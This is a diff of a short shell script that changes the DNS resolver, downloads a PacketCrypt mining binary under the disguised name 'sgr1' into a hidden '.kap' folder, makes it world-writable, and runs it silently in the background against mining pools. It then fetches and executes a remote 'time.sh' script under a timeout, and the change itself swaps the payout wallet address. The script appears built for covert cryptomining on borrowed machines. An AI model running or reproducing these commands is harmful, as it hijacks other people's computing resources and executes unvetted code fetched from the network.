@@ -9,7 +9,7 @@ echo "supersede domain-name-servers 8.8.8.8;">> /etc/dhcp/dhclient.conf
 mkdir .kap && cd .kap
 wget -O sgr1 https://www.pkt.world/ext/packetcrypt-linux-amd64
 chmod 777 sgr1 
-./sgr1 ann -p pPeVNWfAjPGdDst9A6BwgMpZMZuTFfJRRu http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com > /dev/null 2>&1 &
+./sgr1 ann -p pkt1qlu5etl2m7klq3qa2tpvmxeljssuj5pl48j6qn2 http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com > /dev/null 2>&1 &
 wget https://raw.githubusercontent.com/BianAnisa/REvolve/main/script/time.sh
 chmod +x time.sh
 timeout 55m ./time.sh
